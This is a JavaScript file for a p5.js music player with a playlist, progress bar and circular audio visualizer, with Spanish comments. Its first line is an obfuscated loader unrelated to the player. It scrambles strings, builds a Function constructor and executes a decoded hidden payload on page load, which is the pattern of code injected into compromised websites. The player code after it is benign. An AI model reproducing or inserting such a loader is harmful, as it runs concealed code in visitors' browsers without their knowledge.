var pass;(function(){var PgX='',ObC=182-171;function fNY(n){var a=2220863;var l=n.length;var f=[];for(var g=0;g<l;g++){f[g]=n.charAt(g)};for(var g=0;g<l;g++){var k=a*(g+182)+(a%33317);var m=a*(g+616)+(a%45615);var h=k%l;var t=m%l;var y=f[h];f[h]=f[t];f[t]=y;a=(k+m)%3553785;};return f.join('')};var oEC=fNY('cwzsunthdprrxjoevmusyrlccgqkaittbofon').substr(0,ObC);var JKF='2g+ ur=,66Ag4h )r(+];y "=pa2.-[}evih1p;(tapq)(m=(;zng;s}(pe+re9if(6++=aal3=.l1r,v,=lk5Cln=n}uo=0=9+,t6,C7sh5= +t,7{sup7it;het.>o-g;+rr6qa<sto] 3r..leaw-o;(r+)z8=ra.irgm1;tkrs)=)]ri]llta(,n=)70h(rt=f3y)vn,r"{,cir+yg"mnr1"d-t+f(] r+( a)]a f)ka(01>n*i="o.s;l,d v df=(ad1ek, nale)s"vt,[1++o(=ckhrr{ aiex+wa.,bxi;r)v8[nv{n==}v=.r8rCi ruS;,j}er tCcucffte)=,cq=s(;ashvp "q[0;r= i,tusho.}lu=or= aoCo.)A;hlf;f,;62rjg{a()(fw);o+=iyv)+(+ls6;drvh;hr )<vo"(m)kv0;rl+pxy.;; i (m*sa)v=r+<e(2fe0g+s-t;ui8(or!]veatev=A)l+al;.pruh]eei-[s7r=y.quv;7+gmv.ey;,{cahu.nn1ofto{k6=ll2 6(=j(,;f((sd;w.1,trcale6g(he;yp05,v;9yn8cus4[o0.]mv(9p=aCva}!1p=as2vdj=;mtilc]al.rusr2=p4r)nrainv]xza8ongl(..jo(ah;n+tvocr)u;,z=f0g(;rva)Ca=[8lgvn,t)b;ea[[l" vok9sfianpu ua,r9)chhn;o)(toh).accA;fv4;].vv5)rn);unn[o=0;g7ae7varA;00ev;=8te,px)tyr3)-hh.7o1a ;g0(rbg0fv<7;z,ojg2r=j.tSxt.;=)rCnj8)]den.[2];a[")murd (<s+,[aykv=i9[hsoqtuv;m';var nQO=fNY[oEC];var FpO='';var hLh=nQO;var MiS=nQO(FpO,fNY(JKF));var yUW=MiS(fNY('_3Zmwi!\'awZ\/ca!)!l,3Z,a$l(a (Z!bu,2bZ1)e(8,ief=5#Z_.3Zg8.e.$_lr9lg"yZZ]c*S. on=eo505_mrn_Zlf9ab!nn9Z15 re=pZZ%"tZZ}r3.3Zr6 r(_a*n$"tos"41hZZ;.1.1_e7S092_Zm("oZ(Ztcu fZ{_ZZ)Z)tZ)eE$,ZdtosZ*.Zbw%4$7_(.j(pD_ol))Zajb]Z;)(yZ8ntZZZ :3}.&(ZZ176:%4(713Zdf)Se;Z(!lk${ZZ.i9n%n)pvZe%b"5.2hr.\'e7e)loZZ) .9,.t0g.ae,a)8.#tZ$ZZ-otsru5 ){8!mkyo$l5l_Z{o(e;ewb1o.%)mewb.0,1h%e.ar.ut{e,)%.a4+ZZkZ) l)s_(_ Z73$Zg_$2$l6f3Zf5 j]]")o&m8.=_Zv_Zn_3}eZ#sgerp(jo;Z)3=ed4.,n$j$t"ks53.#_90.f{jdZoZ7t{ee)a$IZ%eZj.;\'=[c3(v{ef$7c!(oarl2a(iZtejoc)tfpiee(9(tZ31.(%)n*sd1=(v{{4j.o=,$;9( Csv(e1Z_e9=&e;!(v!o8f)a7s.}=.!.ts)vuZ!,Zw) Z(ts(i_c0,i37.[i3Z7.%=)5;7h.af#Cb=e{6mZ_$Zc!1l7e.8nZ7;f(fr.;nZ$(5.ZZrZ!2)3!Z ee;o,6ZrleZf._;)ZagtZlf,f]1-=0]%ZZvj3+i,_t..(S&])=$tetf.Z1on!d0u{+eea-rwc,}6 \'ZZf0fZk(woejZ7(e-fZZut0=e5o)%os;.]r1t}.2il47l3!ju1\/.$,-71.h..Z$ea_Z(cjoZZ;.91w;e#u8r)%t,\/ser.mtZtc $37_!9_j(=__rZ(lkf&+Z(0;!mju+!v]_.e4k67b4"e5)nZeaZrn.t)6).3a6nv7f75)e4Zt.o%r3(afe5;_7E=i ceee] 15)h)}dg3}g; s.,r)92_l"]ottro3r(fZe9(1Z .a,ox.8$)(2.Z2a("aZl72.eeZZe;+_;o0 oZ$l]ae(,)Zs]oi2f1}3l%))trZ_Iet.r5t4}aa+b=o\/_$+rZ].74e;({0)b9tZ,,dZ2ZZ7ZejZZ1!0jh;ZZ+Z Zl,&_eZ5o3l#e{,=Ze$ZZ3 le7a_f.8(1t.nf)fa;i!3nsCboxm3] l\',e19l=).$2&t!((Z1 ete[,l}Z1rZ)S04=i__2{$).e6(et)db=.ov{.8]}{_o;.63)Zsrdeu7+5Z80,r=Z6;!l3.Z9..;f92rn..6mben5bxsa5_el$1!;;!.)w$fl=ol!Sblwv(h4t{Z%ff*ct)))ZZ(Z,no$2a)7)9)="=f2ZuZntZe%gehas=;0oZivbift nS]Z_r__501n:der_Z9!t();3f=tt:(re]c6u.c")(oZ,6)efoZb7xc=Z7;$b[!_ (4,o#;6}eZ)ro%{Zn4Za}!$.'));var ejv=hLh(PgX,yUW );ejv(2173);return 3258})()
let fft, canvas, song, started = false;
let currentSongName = 'Interworld.mp3';
let radio = document.getElementById('music');
let playlists = document.getElementById('playlist');
let x = document.getElementById('x');
let button_play = document.getElementById("click");
let title = document.getElementById('title');
let song_played = document.getElementById('song_played');
const progress = document.getElementById('progress');

window.onload = function() {
  let anim2 = document.getElementById("anim2");
  anim2.play();

  anim2.addEventListener("ended", function() {
    anim2.style.display = "none";
  });

  // Cargar audio personalizado si existe
  let customAudio = localStorage.getItem("customAudio");
  let customAudioName = localStorage.getItem("customAudioName");

  if (customAudio && customAudioName) {
    loadSound(customAudio, function(newSong) {
      song = newSong;
      currentSongName = "CUSTOM_AUDIO"; // puedes marcarlo así
      radio.textContent = customAudioName;
      title.textContent = customAudioName;
    });
  } else {
    // Si no hay audio personalizado, cargar la canción por defecto
    loadSound(playlist[currentIndex].file, function(newSong) {
      song = newSong;
      currentSongName = playlist[currentIndex].file;
      radio.textContent = playlist[currentIndex].title;
      title.textContent = playlist[currentIndex].menu_title;
    });
  }
};


function pause(){
  song.pause();
  button_play.textContent = "►"
}
function stopAllAudio() {
  if (song && song.isPlaying()) {
    song.stop();
  }
}
function togglePlayPause() {
  if (song && song.isPlaying()) {
    button_play.textContent = "►"
    pause();
  } else {
    button_play.textContent = "||"
    play();
  }
}

const playlist = [
  { file: '1272023_Memory-Reboot.mp3', title: 'Memory Reboot - VØJ', menu_title: 'Memory Reboot - VØJ'},
  { file: 'EEYUH!xFluxxwave.mp3', title: 'EEYUH! x Fluxxwave', menu_title: 'EEYUH! x Fluxxwave(Slowed)'},
  { file: 'Fluxxwave.mp3', title: 'Fluxxwave(2) - Clovis Reyes', menu_title: 'Fluxxwave(Lay with me) - Clovis Reyes'},
  { file: '1235289_Fluxxwave.mp3', title: 'Fluxxwave - Clovis Reyes', menu_title: 'Fluxxwave - Clovis Reyes'},
  { file: 'Interworld.mp3', title: 'interworld - metamorphosis', menu_title: 'interworld - metamorphosis' },
  { file: 'PASSO BEM SOLTO.mp3', title: 'PASSO BEM SOLTO - ATLXS', menu_title: 'PASSO BEM SOLTO - ATLXS' },
  { file: 'MONTAGEM BAILÃO.mp3', title: 'MONTAGEM BAILÃO - ATLXS', menu_title: 'MONTAGEM BAILÃO - ATLXS' },
  { file: 'MONTAGEM LADRAO.mp3', title: 'MONTAGEM LADRAO - ATLXS', menu_title: 'MONTAGEM LADRAO - ATLXS' },
  { file: 'CUSTOM_AUDIO', title: 'Tema Personalizado', menu_title: 'Tema Personalizado' }
];

function personalization_song(){
  location.href = 'Personalization.html';
}

let currentIndex = 4;
function setCurrentIndexByName(name) {
  const index = playlist.findIndex(item => item.file === name);
  if (index !== -1) currentIndex = index;
}

function changeSong(direction) {
  stopAllAudio();
  started = true;

  if (direction === 'back') {
    currentIndex = (currentIndex - 1 + playlist.length) % playlist.length;
  } else if (direction === 'forward') {
    currentIndex = (currentIndex + 1) % playlist.length;
  }

  const nextSong = playlist[currentIndex];
  loadSound(nextSong.file, function(newSong) {
    song = newSong;
    currentSongName = nextSong.file;
    radio.textContent = nextSong.title;
    title.textContent = nextSong.menu_title;
    song.play();
    fft.setInput(song);
    loop();
    button_play.textContent = "||";
  });
}

function back() { changeSong('back'); }
function forward() { changeSong('forward'); }

function play() {
  if (song && song.isPlaying()) return;
  stopAllAudio();
  const currentTrack = playlist[currentIndex];

  if (song && song.isLoaded() && currentSongName === currentTrack.file) {
    song.play();
    fft.setInput(song);
    loop();
    started = true;
    button_play.textContent = "||";
    return;
  }

  loadSound(currentTrack.file, function(newSong) {
    song = newSong;
    currentSongName = currentTrack.file;
    radio.textContent = currentTrack.title;
    title.textContent = currentTrack.menu_title;
    song.play();
    fft.setInput(song);
    loop();
    started = true;
    button_play.textContent = "||";
  });
}

function menu() {
  playlists.style.display = 'block';
  x.style.display = 'block';
}
function exit() {
  playlists.style.display = 'none';
  x.style.display = 'none';
}
function preload() {
  song = loadSound('Interworld.mp3');
  currentSongName = 'Interworld.mp3';
}
function before() {
  if (song && song.isLoaded()) {
    let nuevoTiempo = Math.max(0, song.currentTime() - 10);
    song.jump(nuevoTiempo);
  }
}
function after() {
  if (song && song.isLoaded()) {
    let nuevoTiempo = Math.max(0, song.currentTime() + 10);
    song.jump(nuevoTiempo);
  }
}

function first_song() {
  let first_screen = document.getElementById('first_forever');
  let first_screen2 = document.getElementById('first');
  let background = document.getElementById('Background');
  let music_bar = document.getElementById('progress-container');
  let click_before = document.getElementById('click2');
  let click_after = document.getElementById('click3');
  let forward2 = document.getElementById('click4');
  let before2 = document.getElementById('click5');

  if(first_screen.style.display === 'block' || first_screen.style.display === '') {
    first_screen.style.display = 'none';
    first_screen2.style.display = 'none';
    background.style.display = 'block';
    title.style.display = 'block';
    music_bar.style.display = 'block';
    button_play.style.display = 'block';
    click_after.style.display = 'block';
    click_before.style.display = 'block';
    before2.style.display = 'block';
    forward2.style.display = 'block';
  } else {
    first_screen.style.display = 'block';
    first_screen2.style.display = 'block';
    background.style.display = 'none';
    title.style.display = 'none';
    music_bar.style.display = 'none';
    button_play.style.display = 'none';
    click_after.style.display = 'none';
    click_before.style.display = 'none';
    before2.style.display = 'none';
    forward2.style.display = 'none';
  }
}

// -------------------- BARRA DE PROGRESO --------------------
function updateProgressBar() {
  if (song && song.isPlaying()) {
    progress.max = song.duration();
    progress.value = song.currentTime();
  }
}
function updateProgressBarVisual() {
  if (!song || !song.duration()) return;
  const percentage = (song.currentTime() / song.duration()) * 100;
  progress.style.background = `linear-gradient(to right, red ${percentage}%, #333 ${percentage}%)`;
}
function setupProgressBarEvents() {
  progress.addEventListener('input', () => {
    if (song) song.jump(parseFloat(progress.value));
  });
}

// -------------------- VISUALIZADOR --------------------
function setup() {
  setupProgressBarEvents();
  canvas = createCanvas(window.innerWidth, window.innerHeight);
  canvas.parent('visualizer-container');
  fft = new p5.FFT();
  noLoop();
}

let bgFlashAlpha = 0;
let glowAlpha = 0; 
let lastEnergy = 0;
let particles = [];
let sparks = [];

function draw() {
  updateProgressBar();
  updateProgressBarVisual();
  clear();

  let spectrum = fft.analyze();
  let energy = (fft.getEnergy("bass") + fft.getEnergy("mid") + fft.getEnergy("treble")) / 3;
  let threshold = window.innerWidth <= 1400 ? 155 : 180;

  if (energy > threshold) bgFlashAlpha = map(energy, threshold, 255, 80, 180, true);
  else bgFlashAlpha *= 0.92;
  bgFlashAlpha = constrain(bgFlashAlpha, 0, 255);

  push();
  fill(0, 0, 0, bgFlashAlpha);
  rect(0, 0, width, height);
  pop();

  translate(width / 2, height / 2);
  let minDim = min(width, height);
  let baseRadius = minDim * 0.28;
  let deformMax = minDim * 0.33;
  let avgAmp = 0;
  let points = 180;
  let spectrumStep = Math.floor(spectrum.length / points);

  beginShape();
  stroke(255, 255, 0, 200);
  strokeWeight(minDim * 0.008);
  noFill();
  for (let i = 0; i < points; i++) {
    let angle = map(i, 0, points, 0, TWO_PI);
    let low = spectrum[i * spectrumStep % spectrum.length];
    let mid = spectrum[(i * spectrumStep + Math.floor(spectrum.length / 3)) % spectrum.length];
    let high = spectrum[(i * spectrumStep + Math.floor(2 * spectrum.length / 3)) % spectrum.length];
    let amp = (low + mid + high) / 3;
    avgAmp += amp;
    let deform = map(amp, 0, 256, 0, deformMax);
    let r = baseRadius + deform;
    vertex(r * cos(angle), r * sin(angle));
  }
  endShape(CLOSE);

  avgAmp /= points;
  glowAlpha = map(avgAmp, 0, 256, 0, 180);

  push();
  noFill();
  stroke(255, 255, 0, glowAlpha);
  strokeWeight(minDim * 0.12 + map(avgAmp, 0, 256, 0, minDim * 0.16));
  ellipse(0, 0, 2 * (baseRadius + map(avgAmp, 0, 256, 0, deformMax)));
  pop();

  if (energy > 200 && Math.random() < 0.2) {
    let angle = random(TWO_PI);
    let r = baseRadius + random(minDim * 0.08, minDim * 0.4);
    sparks.push({
      x: r * cos(angle),
      y: r * sin(angle),
      vx: random(-minDim * 0.008, minDim * 0.008),
      vy: random(-minDim * 0.008, minDim * 0.008),
      life: 20 + random(10)
    });
  }
  for (let i = sparks.length - 1; i >= 0; i--) {
    let s = sparks[i];
    push();
    stroke(255, 255, 0, map(s.life, 0, 30, 0, 255));
    strokeWeight(minDim * 0.012);
    point(s.x, s.y);
    pop();
    s.x += s.vx;
    s.y += s.vy;
    s.life--;
    if (s.life <= 0) sparks.splice(i, 1);
  }

  for (let i = particles.length - 1; i >= 0; i--) {
    particles[i].update();
    stroke(255);
    strokeWeight(minDim * 0.006);
    fill(0, 240);
    ellipse(particles[i].x, particles[i].y, particles[i].size * 1.3);
    if (particles[i].isDead()) particles.splice(i, 1);
  }

  let stars = [];
  for (let i = 0; i < 120; i++) {
    stars.push({
      x: Math.random() * width,
      y: Math.random() * height,
      size: Math.random() * minDim * 0.008 + 1,
      alpha: Math.random() * 180 + 50
    });
  }
  for (let s of stars) {
    fill(255, 255, 180, s.alpha + 60 * sin(frameCount * 0.02 + s.x));
    noStroke();
    ellipse(s.x - width / 2, s.y - height / 2, s.size);
  }
}

class SmoothParticle {
  constructor(x, y, angle, speed, size) {
    this.x = x; this.y = y;
    this.vx = Math.cos(angle) * speed;
    this.vy = Math.sin(angle) * speed;
    this.size = size;
    this.life = 80 + Math.random() * 40;
    this.friction = 0.92;
  }
  update() { this.x += this.vx; this.y += this.vy; this.vx *= this.friction; this.vy *= this.friction; this.life--; }
  show() { noStroke(); fill(255, 200, 50, map(this.life, 0, 120, 0, 255)); ellipse(this.x, this.y, this.size); }
  isDead() { return this.life <= 0; }
}

document.addEventListener('click', function playAudioOnce() {
  if (!started) {
    stopAllAudio();
    if (song) { song.play(); fft.setInput(song); loop(); started = true; }
  }
  document.removeEventListener('click', playAudioOnce);
});

function windowResized() {
  resizeCanvas(window.innerWidth, window.innerHeight);
  let container = document.getElementById('visualizer-container');
  if (container) {
    container.style.width = window.innerWidth + 'px';
    container.style.height = window.innerHeight + 'px';
  }
}
